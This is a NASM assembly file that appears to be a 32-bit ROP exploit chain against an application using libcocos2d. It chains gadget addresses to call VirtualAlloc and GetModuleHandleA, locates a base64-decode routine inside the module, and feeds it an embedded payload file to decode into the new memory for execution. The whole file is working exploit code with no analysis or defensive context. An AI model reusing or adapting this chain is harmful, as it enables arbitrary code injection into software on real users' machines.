BITS 32

; ----- call virtualalloc ----

dd 0x18bc3 ; pop eax
dd 0x1e0c8 ; &VirtualAlloc
dd 0xf0dd ; jmp dword ptr [eax]
dd 0x11223344 ; ret
virtualalloc_addr: dd 1 ; addr
dd 0x01010101 ; size
virtualalloc_type: dd 1 ; type
virtualalloc_prot: dd 1 ; prot 

; eax = allocated block, now we need to decode base64 into it

; copy to return address
dd 0x180ce ; mov dword ptr [esp + 0x34], eax; call edi; [noret]
dd 1 ; 0
dd 0x1006 ; 4, ret (nop)

; copy to output
dd 0x180ce ; mov dword ptr [esp + 0x34], eax; call edi; [noret]
dd 1 ; 0
dd 0x1006 ; 4, ret (nop)
dd 0x18bc3 ; 8, pop eax
dd 0x1e020 ; c, &GetModuleHandleA
dd 0xf0dd ; 10, jmp dword ptr [eax]
dd 0x16426 ; 14, ret, pop ecx
gmh_name: dd 1 ; 18, modulename

dd -0xd9a10 ; 1c
dd 0x1acea ; 20, sub eax, ecx

dd 0x18b94 ; 24, jmp eax
dd 1 ; 28, return
%if 0
b64decode_input: dd DONTCARE ; 2c, input
b64decode_inlen: dd DONTCARE ; 30, input length
dd DONTCARE ; 34, output
dd 0x01010101 ; output length
dd 0x01010101 ; urlsafe (nonzero = true)

payload:
incbin "../build/payload_b64.txt"
payload_len equ $ - payload

cocos: db "libcocos2d" ; null byte inserted as terminator
%endif
